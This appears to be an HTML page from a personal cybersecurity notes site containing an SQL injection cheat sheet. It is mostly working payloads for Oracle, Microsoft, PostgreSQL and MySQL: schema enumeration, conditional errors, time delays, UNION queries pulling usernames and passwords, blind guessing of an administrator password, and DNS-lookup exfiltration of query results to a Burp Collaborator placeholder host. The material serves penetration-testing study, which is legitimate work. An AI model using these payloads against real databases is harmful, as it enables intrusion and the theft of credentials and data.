<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><link rel="icon" href="/Notes/favicon.ico"/><title>SQL_Injection</title><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="description" content="Personal Knowledge Space"/><meta property="og:title" content="SQL_Injection"/><meta property="og:description" content="Personal Knowledge Space"/><meta property="og:url" content="https://greguus.github.io//Notes/notes/ecm8gbfd442dpxbe5fggfzo/"/><meta property="og:type" content="article"/><meta property="article:published_time" content="2/26/2023"/><meta property="article:modified_time" content="2/27/2023"/><link rel="canonical" href="https://greguus.github.io//Notes/notes/ecm8gbfd442dpxbe5fggfzo/"/><meta name="next-head-count" content="14"/><link rel="preload" href="/Notes/_next/static/css/1ff0b9d7e742b4b0.css" as="style"/><link rel="stylesheet" href="/Notes/_next/static/css/1ff0b9d7e742b4b0.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/Notes/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/Notes/_next/static/chunks/webpack-25e92ed568969c7e.js" defer=""></script><script src="/Notes/_next/static/chunks/framework-28c999baf2863c3d.js" defer=""></script><script src="/Notes/_next/static/chunks/main-42985e5d01110972.js" defer=""></script><script src="/Notes/_next/static/chunks/pages/_app-735832bdabb9d926.js" defer=""></script><script src="/Notes/_next/static/chunks/935-4dee79e80b8641c6.js" defer=""></script><script src="/Notes/_next/static/chunks/6-50972def09142ee2.js" defer=""></script><script src="/Notes/_next/static/chunks/pages/notes/%5Bid%5D-78d472fa3b924116.js" defer=""></script><script src="/Notes/_next/static/j9CSGb22FfOPbRIS6QcPV/_buildManifest.js" defer=""></script><script src="/Notes/_next/static/j9CSGb22FfOPbRIS6QcPV/_ssgManifest.js" defer=""></script></head><body><div id="__next" data-reactroot=""><section class="ant-layout" style="width:100%;min-height:100%"><header class="ant-layout-header" style="position:fixed;isolation:isolate;z-index:1;width:100%;border-bottom:1px solid #d4dadf;height:64px;padding:0 24px 0 2px"><div class="ant-row ant-row-center" style="max-width:992px;justify-content:space-between;margin:0 auto"><div style="display:flex" class="ant-col ant-col-xs-20 ant-col-sm-4"></div><div class="ant-col gutter-row ant-col-xs-0 ant-col-sm-20 ant-col-md-20 ant-col-lg-19"><div class="ant-select ant-select-lg ant-select-auto-complete ant-select-single ant-select-allow-clear ant-select-show-search" style="width:100%"><div class="ant-select-selector"><span class="ant-select-selection-search"><input type="search" autoComplete="off" class="ant-select-selection-search-input" role="combobox" aria-haspopup="listbox" aria-owns="undefined_list" aria-autocomplete="list" aria-controls="undefined_list" aria-activedescendant="undefined_list_0" value=""/></span><span class="ant-select-selection-placeholder">For full text search please use the &#x27;?&#x27; prefix. e.g. ? Onboarding</span></div></div></div><div style="display:none;align-items:center;justify-content:center" class="ant-col ant-col-xs-4 ant-col-sm-4 ant-col-md-0 ant-col-lg-0"><span role="img" aria-label="menu" style="font-size:24px" tabindex="-1" class="anticon anticon-menu"><svg viewBox="64 64 896 896" focusable="false" data-icon="menu" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M904 160H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8zm0 624H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8zm0-312H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8z"></path></svg></span></div></div></header><section class="ant-layout" style="margin-top:64px;display:flex;flex-direction:row"><div class="site-layout-sidebar" style="flex:0 0 auto;width:calc(max((100% - 992px) / 2, 0px) + 200px);min-width:200px;padding-left:calc((100% - 992px) / 2)"><aside class="ant-layout-sider ant-layout-sider-dark" style="position:fixed;overflow:auto;height:calc(100vh - 64px);background-color:transparent;flex:0 0 200px;max-width:200px;min-width:200px;width:200px"><div class="ant-layout-sider-children"></div></aside></div><main class="ant-layout-content side-layout-main" style="max-width:1200px;min-width:0;display:block"><div style="padding:0 24px"><div class="main-content" role="main"><div class="ant-row"><div class="ant-col ant-col-24"><div class="ant-row" style="margin-left:-10px;margin-right:-10px"><div style="padding-left:10px;padding-right:10px" class="ant-col ant-col-xs-24 ant-col-md-18"><div><h1 id="sql_injection">SQL_Injection<a aria-hidden="true" class="anchor-heading icon-link" href="#sql_injection"></a></h1>
<h2 id="sql-injection-cheat-sheet">SQL injection cheat sheet<a aria-hidden="true" class="anchor-heading icon-link" href="#sql-injection-cheat-sheet"></a></h2>
<p>This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.</p>
<h3 id="string-concatenation">String concatenation<a aria-hidden="true" class="anchor-heading icon-link" href="#string-concatenation"></a></h3>
<p>You can concatenate together multiple strings to make a single string.</p>
<pre class="language-sql"><code class="language-sql">Oracle	<span class="token string">'foo'</span><span class="token operator">||</span><span class="token string">'bar'</span>
Microsoft	<span class="token string">'foo'</span><span class="token operator">+</span><span class="token string">'bar'</span>
PostgreSQL	<span class="token string">'foo'</span><span class="token operator">||</span><span class="token string">'bar'</span>
MySQL	<span class="token string">'foo'</span> <span class="token string">'bar'</span> <span class="token punctuation">[</span>Note the space <span class="token operator">between</span> the two strings<span class="token punctuation">]</span>
CONCAT<span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span><span class="token string">'bar'</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="substring">Substring<a aria-hidden="true" class="anchor-heading icon-link" href="#substring"></a></h3>
<p>You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ba.</p>
<pre class="language-sql"><code class="language-sql">Oracle	SUBSTR<span class="token punctuation">(</span><span class="token string">'foobar'</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
Microsoft	SUBSTRING<span class="token punctuation">(</span><span class="token string">'foobar'</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
PostgreSQL	SUBSTRING<span class="token punctuation">(</span><span class="token string">'foobar'</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
MySQL	SUBSTRING<span class="token punctuation">(</span><span class="token string">'foobar'</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="comments">Comments<a aria-hidden="true" class="anchor-heading icon-link" href="#comments"></a></h3>
<p>You can use comments to truncate a query and remove the portion of the original query that follows your input.</p>
<pre class="language-sql"><code class="language-sql">Oracle	<span class="token comment">--comment</span>
Microsoft	<span class="token comment">--comment</span>
<span class="token comment">/*comment*/</span>
PostgreSQL	<span class="token comment">--comment</span>
<span class="token comment">/*comment*/</span>
MySQL	<span class="token comment">#comment</span>
<span class="token comment">-- comment [Note the space after the double dash]</span>
<span class="token comment">/*comment*/</span>
</code></pre>
<h3 id="database-version">Database version<a aria-hidden="true" class="anchor-heading icon-link" href="#database-version"></a></h3>
<p>You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.</p>
<pre class="language-sql"><code class="language-sql">Oracle	<span class="token keyword">SELECT</span> banner <span class="token keyword">FROM</span> v$version
<span class="token keyword">SELECT</span> version <span class="token keyword">FROM</span> v$instance
Microsoft	<span class="token keyword">SELECT</span> @<span class="token variable">@version</span>
PostgreSQL	<span class="token keyword">SELECT</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span>
MySQL	<span class="token keyword">SELECT</span> @<span class="token variable">@version</span>
</code></pre>
<h3 id="database-contents">Database contents<a aria-hidden="true" class="anchor-heading icon-link" href="#database-contents"></a></h3>
<p>You can list the tables that exist in the database, and the columns that those tables contain.</p>
<pre class="language-sql"><code class="language-sql">Oracle	<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> all_tables
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> all_tab_columns <span class="token keyword">WHERE</span> table_name <span class="token operator">=</span> <span class="token string">'TABLE-NAME-HERE'</span>
Microsoft	<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">WHERE</span> table_name <span class="token operator">=</span> <span class="token string">'TABLE-NAME-HERE'</span>
PostgreSQL	<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">WHERE</span> table_name <span class="token operator">=</span> <span class="token string">'TABLE-NAME-HERE'</span>
MySQL	<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">WHERE</span> table_name <span class="token operator">=</span> <span class="token string">'TABLE-NAME-HERE'</span>
</code></pre>
<h3 id="conditional-errors">Conditional errors<a aria-hidden="true" class="anchor-heading icon-link" href="#conditional-errors"></a></h3>
<p>You can test a single boolean condition and trigger a database error if the condition is true.</p>
<pre class="language-sql"><code class="language-sql">Oracle	<span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> <span class="token punctuation">(</span>YOUR<span class="token operator">-</span>CONDITION<span class="token operator">-</span>HERE<span class="token punctuation">)</span> <span class="token keyword">THEN</span> TO_CHAR<span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token boolean">NULL</span> <span class="token keyword">END</span> <span class="token keyword">FROM</span> dual
Microsoft	<span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> <span class="token punctuation">(</span>YOUR<span class="token operator">-</span>CONDITION<span class="token operator">-</span>HERE<span class="token punctuation">)</span> <span class="token keyword">THEN</span> <span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span> <span class="token keyword">ELSE</span> <span class="token boolean">NULL</span> <span class="token keyword">END</span>
PostgreSQL	<span class="token number">1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> <span class="token punctuation">(</span>YOUR<span class="token operator">-</span>CONDITION<span class="token operator">-</span>HERE<span class="token punctuation">)</span> <span class="token keyword">THEN</span> <span class="token number">1</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token boolean">NULL</span> <span class="token keyword">END</span><span class="token punctuation">)</span>
MySQL	<span class="token keyword">SELECT</span> <span class="token keyword">IF</span><span class="token punctuation">(</span>YOUR<span class="token operator">-</span>CONDITION<span class="token operator">-</span>HERE<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="batched-or-stacked-queries">Batched (or stacked) queries<a aria-hidden="true" class="anchor-heading icon-link" href="#batched-or-stacked-queries"></a></h3>
<p>You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.</p>
<pre class="language-sql"><code class="language-sql">Oracle	Does <span class="token operator">not</span> support batched queries<span class="token punctuation">.</span>
Microsoft	QUERY<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>HERE<span class="token punctuation">;</span> QUERY<span class="token operator">-</span><span class="token number">2</span><span class="token operator">-</span>HERE
PostgreSQL	QUERY<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>HERE<span class="token punctuation">;</span> QUERY<span class="token operator">-</span><span class="token number">2</span><span class="token operator">-</span>HERE
MySQL	QUERY<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>HERE<span class="token punctuation">;</span> QUERY<span class="token operator">-</span><span class="token number">2</span><span class="token operator">-</span>HERE
</code></pre>
<blockquote>
<p>Note
With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.</p>
</blockquote>
<h3 id="time-delays">Time delays<a aria-hidden="true" class="anchor-heading icon-link" href="#time-delays"></a></h3>
<p>You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.</p>
<pre class="language-sql"><code class="language-sql">Oracle	dbms_pipe<span class="token punctuation">.</span>receive_message<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>
Microsoft	<span class="token keyword">WAITFOR</span> DELAY <span class="token string">'0:0:10'</span>
PostgreSQL	<span class="token keyword">SELECT</span> pg_sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
MySQL	<span class="token keyword">SELECT</span> SLEEP<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="conditional-time-delays">Conditional time delays<a aria-hidden="true" class="anchor-heading icon-link" href="#conditional-time-delays"></a></h3>
<p>You can test a single boolean condition and trigger a time delay if the condition is true.</p>
<pre class="language-sql"><code class="language-sql">Oracle	<span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> <span class="token punctuation">(</span>YOUR<span class="token operator">-</span>CONDITION<span class="token operator">-</span>HERE<span class="token punctuation">)</span> <span class="token keyword">THEN</span> <span class="token string">'a'</span><span class="token operator">||</span>dbms_pipe<span class="token punctuation">.</span>receive_message<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token boolean">NULL</span> <span class="token keyword">END</span> <span class="token keyword">FROM</span> dual
Microsoft	<span class="token keyword">IF</span> <span class="token punctuation">(</span>YOUR<span class="token operator">-</span>CONDITION<span class="token operator">-</span>HERE<span class="token punctuation">)</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'0:0:10'</span>
PostgreSQL	<span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> <span class="token punctuation">(</span>YOUR<span class="token operator">-</span>CONDITION<span class="token operator">-</span>HERE<span class="token punctuation">)</span> <span class="token keyword">THEN</span> pg_sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> pg_sleep<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">END</span>
MySQL	<span class="token keyword">SELECT</span> <span class="token keyword">IF</span><span class="token punctuation">(</span>YOUR<span class="token operator">-</span>CONDITION<span class="token operator">-</span>HERE<span class="token punctuation">,</span>SLEEP<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="dns-lookup">DNS lookup<a aria-hidden="true" class="anchor-heading icon-link" href="#dns-lookup"></a></h3>
<p>You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.</p>
<p>Oracle	The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:</p>
<pre class="language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> EXTRACTVALUE<span class="token punctuation">(</span>xmltype<span class="token punctuation">(</span><span class="token string">'&#x3C;?xml version="1.0" encoding="UTF-8"?>&#x3C;!DOCTYPE root [ &#x3C;!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/l'</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> dual
</code></pre>
<p>The following technique works on fully patched Oracle installations, but requires elevated privileges:</p>
<pre class="language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> UTL_INADDR<span class="token punctuation">.</span>get_host_address<span class="token punctuation">(</span><span class="token string">'BURP-COLLABORATOR-SUBDOMAIN'</span><span class="token punctuation">)</span>
Microsoft	<span class="token keyword">exec</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_dirtree <span class="token string">'//BURP-COLLABORATOR-SUBDOMAIN/a'</span>
PostgreSQL	copy <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">to</span> program <span class="token string">'nslookup BURP-COLLABORATOR-SUBDOMAIN'</span>
MySQL	The <span class="token keyword">following</span> techniques <span class="token keyword">work</span> <span class="token keyword">on</span> Windows only:
LOAD_FILE<span class="token punctuation">(</span><span class="token string">'\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'</span><span class="token punctuation">)</span>
<span class="token keyword">SELECT</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</span>
</code></pre>
<h3 id="dns-lookup-with-data-exfiltration">DNS lookup with data exfiltration<a aria-hidden="true" class="anchor-heading icon-link" href="#dns-lookup-with-data-exfiltration"></a></h3>
<p>You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.</p>
<pre class="language-sql"><code class="language-sql">Oracle	<span class="token keyword">SELECT</span> EXTRACTVALUE<span class="token punctuation">(</span>xmltype<span class="token punctuation">(</span><span class="token string">'&#x3C;?xml version="1.0" encoding="UTF-8"?>&#x3C;!DOCTYPE root [ &#x3C;!ENTITY % remote SYSTEM "http://'</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> YOUR<span class="token operator">-</span>QUERY<span class="token operator">-</span>HERE<span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/l'</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> dual
Microsoft	<span class="token keyword">declare</span> <span class="token variable">@p</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">set</span> <span class="token variable">@p</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> YOUR<span class="token operator">-</span>QUERY<span class="token operator">-</span>HERE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">'master..xp_dirtree "//'</span><span class="token operator">+</span><span class="token variable">@p</span><span class="token operator">+</span><span class="token string">'.BURP-COLLABORATOR-SUBDOMAIN/a"'</span><span class="token punctuation">)</span>
PostgreSQL	<span class="token keyword">create</span> <span class="token operator">OR</span> <span class="token keyword">replace</span> <span class="token keyword">function</span> f<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">returns</span> void <span class="token keyword">as</span> $$
<span class="token keyword">declare</span> c <span class="token keyword">text</span><span class="token punctuation">;</span>
<span class="token keyword">declare</span> p <span class="token keyword">text</span><span class="token punctuation">;</span>
<span class="token keyword">begin</span>
<span class="token keyword">SELECT</span> <span class="token keyword">into</span> p <span class="token punctuation">(</span><span class="token keyword">SELECT</span> YOUR<span class="token operator">-</span>QUERY<span class="token operator">-</span>HERE<span class="token punctuation">)</span><span class="token punctuation">;</span>
c :<span class="token operator">=</span> <span class="token string">'copy (SELECT '''') to program ''nslookup '</span><span class="token operator">||</span>p<span class="token operator">||</span><span class="token string">'.BURP-COLLABORATOR-SUBDOMAIN'''</span><span class="token punctuation">;</span>
<span class="token keyword">execute</span> c<span class="token punctuation">;</span>
<span class="token keyword">END</span><span class="token punctuation">;</span>
$$ <span class="token keyword">language</span> plpgsql security <span class="token keyword">definer</span><span class="token punctuation">;</span>
<span class="token keyword">SELECT</span> f<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
MySQL	The <span class="token keyword">following</span> technique works <span class="token keyword">on</span> Windows only:
<span class="token keyword">SELECT</span> YOUR<span class="token operator">-</span>QUERY<span class="token operator">-</span>HERE <span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</span>
</code></pre>
<h3 id="union-attacks">UNION attacks<a aria-hidden="true" class="anchor-heading icon-link" href="#union-attacks"></a></h3>
<p>For a UNION query to work, two key requirements must be met:</p>
<ul>
<li>
<p>The individual queries must return the same number of columns.<br></p>
</li>
<li>
<p>The data types in each column must be compatible between the individual queries.</p>
<p>  <strong>Number of columns:</strong></p>
<pre class="language-sql"><code class="language-sql"><span class="token string">' ORDER BY 1--
'</span> <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> <span class="token number">2</span><span class="token comment">--</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> until error

<span class="token operator">OR</span>

<span class="token string">' UNION SELECT NULL--
'</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token comment">--</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> until success
</code></pre>
<p>  <strong>Probing for string data in columns:</strong></p>
<pre class="language-sql"><code class="language-sql"><span class="token string">' UNION SELECT '</span>a<span class="token string">',NULL,NULL,NULL--
'</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token comment">--</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> until successfully injected string <span class="token keyword">value</span>
</code></pre>
<p>  <strong>Retrieving data</strong></p>
<pre class="language-sql"><code class="language-sql">' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users<span class="token comment">--</span>
</code></pre>
<p>  <strong>Retrieving multiple values within a single column</strong>
<br></p>
<pre class="language-sql"><code class="language-sql"><span class="token string">' UNION SELECT username || '</span><span class="token operator">~</span>' <span class="token operator">||</span> password <span class="token keyword">FROM</span> users<span class="token comment">--</span>
</code></pre>
</li>
</ul>
<h3 id="blind-injection">Blind Injection<a aria-hidden="true" class="anchor-heading icon-link" href="#blind-injection"></a></h3>
<p><strong>Divide and conquer password guessing:</strong></p>
<pre class="language-sql"><code class="language-sql"><span class="token string">' AND SUBSTRING((SELECT Password FROM Users WHERE Username = '</span>Administrator<span class="token string">'), 1, 1) > '</span>m

<span class="token keyword">IF</span> <span class="token boolean">TRUE</span>:

xyz<span class="token string">' AND SUBSTRING((SELECT Password FROM Users WHERE Username = '</span>Administrator<span class="token string">'), 1, 1) > '</span>t

<span class="token keyword">IF</span> <span class="token boolean">FALSE</span>:
Try <span class="token keyword">for</span> example:
xyz<span class="token string">' AND SUBSTRING((SELECT Password FROM Users WHERE Username = '</span>Administrator<span class="token string">'), 1, 1) = '</span>s

<span class="token keyword">IF</span> <span class="token boolean">TRUE</span><span class="token punctuation">,</span> <span class="token keyword">first</span> letter <span class="token keyword">of</span> the password has been found<span class="token punctuation">.</span>
</code></pre>
<h3 id="sql-injection-in-different-contexts">SQL injection in different contexts<a aria-hidden="true" class="anchor-heading icon-link" href="#sql-injection-in-different-contexts"></a></h3>
<p>***JSON or XML based SQL injection often require code obfuscation.
<br>
Most common encoder:
urlencode, dec, html entity</p>
<p><a href="https://hackvertor.co.uk/public">Hackvertor</a> is a good tool to start with.<br>
Also there is a plugin for Burp with the same name working with repeater.</p>
<hr>
<strong>Backlinks</strong>
<ul>
<li><a href="/Notes/notes/t7zelcb6b17opo2gjy4y9cq">Cheat Sheets:</a></li>
</ul></div></div><div style="padding-left:10px;padding-right:10px" class="ant-col ant-col-xs-0 ant-col-md-6"><div><div class=""><div class="ant-anchor-wrapper dendron-toc" style="max-height:calc(100vh - 64px);z-index:1"><div class="ant-anchor"><div class="ant-anchor-ink"><span class="ant-anchor-ink-ball"></span></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#sql-injection-cheat-sheet" title="SQL injection cheat sheet">SQL injection cheat sheet</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#string-concatenation" title="String concatenation">String concatenation</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#substring" title="Substring">Substring</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#comments" title="Comments">Comments</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#database-version" title="Database version">Database version</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#database-contents" title="Database contents">Database contents</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#conditional-errors" title="Conditional errors">Conditional errors</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#batched-or-stacked-queries" title="Batched (or stacked) queries">Batched (or stacked) queries</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#time-delays" title="Time delays">Time delays</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#conditional-time-delays" title="Conditional time delays">Conditional time delays</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#dns-lookup" title="DNS lookup">DNS lookup</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#dns-lookup-with-data-exfiltration" title="DNS lookup with data exfiltration">DNS lookup with data exfiltration</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#union-attacks" title="UNION attacks">UNION attacks</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#blind-injection" title="Blind Injection">Blind Injection</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#sql-injection-in-different-contexts" title="SQL injection in different contexts">SQL injection in different contexts</a></div></div></div></div></div></div></div></div></div></div></div><div class="ant-divider ant-divider-horizontal" role="separator"></div><footer class="ant-layout-footer" style="padding:0 24px 24px"></footer></main></section></section></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"note":{"id":"ecm8gbfd442dpxbe5fggfzo","title":"SQL_Injection","desc":"","updated":1677476127749,"created":1677380025812,"custom":{},"fname":"Cheat Sheets.SQL_Injection","type":"note","vault":{"fsPath":".","selfContained":true,"name":"Cybersecurity_Notes"},"contentHash":"bf5e18407f491810ae586ac3381f6f3c","links":[{"from":{"fname":"Cheat Sheets","id":"t7zelcb6b17opo2gjy4y9cq","vaultName":"Cybersecurity_Notes"},"type":"backlink","position":{"start":{"line":10,"column":1,"offset":417},"end":{"line":10,"column":45,"offset":461},"indent":[]},"value":"Cheat Sheets.SQL_Injection"}],"anchors":{"sql-injection-cheat-sheet":{"type":"header","text":"SQL injection cheat sheet","value":"sql-injection-cheat-sheet","line":7,"column":0,"depth":2},"string-concatenation":{"type":"header","text":"String concatenation","value":"string-concatenation","line":10,"column":0,"depth":3},"substring":{"type":"header","text":"Substring","value":"substring","line":20,"column":0,"depth":3},"comments":{"type":"header","text":"Comments","value":"comments","line":28,"column":0,"depth":3},"database-version":{"type":"header","text":"Database version","value":"database-version","line":40,"column":0,"depth":3},"database-contents":{"type":"header","text":"Database contents","value":"database-contents","line":49,"column":0,"depth":3},"conditional-errors":{"type":"header","text":"Conditional errors","value":"conditional-errors","line":61,"column":0,"depth":3},"batched-or-stacked-queries":{"type":"header","text":"Batched (or stacked) queries","value":"batched-or-stacked-queries","line":69,"column":0,"depth":3},"time-delays":{"type":"header","text":"Time delays","value":"time-delays","line":80,"column":0,"depth":3},"conditional-time-delays":{"type":"header","text":"Conditional time delays","value":"conditional-time-delays","line":88,"column":0,"depth":3},"dns-lookup":{"type":"header","text":"DNS lookup","value":"dns-lookup","line":96,"column":0,"depth":3},"dns-lookup-with-data-exfiltration":{"type":"header","text":"DNS lookup with data exfiltration","value":"dns-lookup-with-data-exfiltration","line":112,"column":0,"depth":3},"union-attacks":{"type":"header","text":"UNION attacks","value":"union-attacks","line":130,"column":0,"depth":3},"blind-injection":{"type":"header","text":"Blind Injection","value":"blind-injection","line":165,"column":0,"depth":3},"sql-injection-in-different-contexts":{"type":"header","text":"SQL injection in different contexts","value":"sql-injection-in-different-contexts","line":181,"column":0,"depth":3}},"children":[],"parent":"t7zelcb6b17opo2gjy4y9cq","data":{}},"body":"\u003ch1 